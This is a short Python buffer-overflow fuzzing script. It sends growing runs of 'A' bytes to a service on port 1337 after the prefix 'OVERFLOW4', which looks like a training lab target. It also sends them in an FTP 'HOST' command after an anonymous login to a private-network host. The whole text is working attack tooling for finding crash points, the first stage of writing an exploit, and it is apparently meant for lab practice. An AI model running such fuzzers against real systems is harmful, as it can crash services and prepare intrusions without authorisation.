import socket

bof = b"A"

for i in range(10, 3000, 100):
    
    with socket.socket() as s:
        s.connect(("10.10.92.67", 1337))
        s.recv(1024)
        print(f"Sending {i} bytes")
        s.send(b"OVERFLOW4 " + bof * i)
        print(s.recv(1024))


for i in range(50, 2000, 50):
    
    with socket.socket() as s:
        s.connect(("192.168.200.100", 21))
        s.recv(1024)
        print(f"Sending {i} bytes")
        s.send(b"USER anonymous\r\n")
        s.recv(1024)
        s.send(b"PASS anonymous\r\n")
        s.recv(1024)
        s.send(b"HOST " + bof * i)
        print(s.recv(1024))